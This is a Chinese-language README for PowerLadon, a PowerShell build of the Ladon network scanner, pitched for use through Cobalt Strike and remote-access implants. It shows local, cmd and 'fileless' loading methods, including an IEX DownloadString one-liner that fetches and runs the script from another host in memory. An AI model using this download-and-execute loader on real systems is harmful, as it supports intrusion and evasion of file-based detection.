# Ladon NetScan For PowerShell
![](https://k8gege.github.io/k8img/Ladon/Dragon.jpg)

[![Author](https://img.shields.io/badge/Author-k8gege-blueviolet)](https://github.com/k8gege) 
[![Ladon](https://img.shields.io/badge/Ladon-5.5-yellowgreen)](https://github.com/k8gege/Ladon) 
[![Bin](https://img.shields.io/badge/Ladon-Bin-ff69b4)](https://github.com/k8gege/Ladon/releases) 
[![GitHub issues](https://img.shields.io/github/issues/k8gege/Ladon)](https://github.com/k8gege/Ladon/issues) 
[![Github Stars](https://img.shields.io/github/stars/k8gege/Ladon)](https://github.com/k8gege/Ladon) 
[![GitHub forks](https://img.shields.io/github/forks/k8gege/Ladon)](https://github.com/k8gege/Ladon)
[![GitHub license](https://img.shields.io/github/license/k8gege/Ladon)](https://github.com/k8gege/Ladon)

### Ladon 5.5
<img src=https://k8gege.github.io/k8img/Ladon/Ladon.gif></img>
### Cobalt Strike
<img src=https://k8gege.github.io/k8img/Ladon/CS_Ladon.gif></img>
### PowerLadon
<img src=https://k8gege.github.io/k8img/Ladon/PowerLadon.gif></img>
### 使用说明

ID | 主题 |  URL 
-|-|-
1 | Ladon文档主页 | https://github.com/k8gege/Ladon/wiki<br>
2 | 基础用法详解 | https://github.com/k8gege/Ladon/wiki/Ladon-Usage<br>
3 | Cobalt Strike | https://github.com/k8gege/Ladon/wiki/Ladon-&-Cobalt-Strike<br>
4 | Exp生成器使用 | https://github.com/k8gege/Ladon/wiki/LadonExp-Usage
5 | 高度自定义插件 | https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle
6 | 外部模块参考 | https://github.com/k8gege/K8CScan/wiki
7 | PowerShell | https://github.com/k8gege/Ladon/wiki/Ladon-&-PowerShell
8 | 跨平台使用 | 目前有python版的Cscan但功能少，后续可能通过mono跨平台
9 | 漏洞演示视频 | https://github.com/k8gege/K8CScan/tree/master/Video
### PowerLadon
PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br>
PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。<br>

#### 0x001 PowerShell本地加载<br>
适用于支持PowerShell交互远控或Shell，如Cobalt Strike
```bash
> powershell 
> Import-Module .\Ladon.ps1
> Ladon OnlinePC
```
<img src=https://k8gege.github.io/k8img/Ladon/PowerLadon.gif></img>

#### 0x002 Cmd本地加载
适用于还没跟上时代的远控或Shell只支持CMD交互
```bash
> powershell Import-Module .\Ladon.ps1;Ladon OnlinePC
```
<img src=https://k8gege.github.io/k8img/Ladon/ps/CmdPSLadon.gif></img>

#### 0x003 Cmd远程加载
适用于还没跟上时代的远控或Shell只支持CMD交互
```bash
> powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"
```
<img src=https://k8gege.github.io/k8img/Ladon/ps/CmdPSRemoteLadon.gif></img>
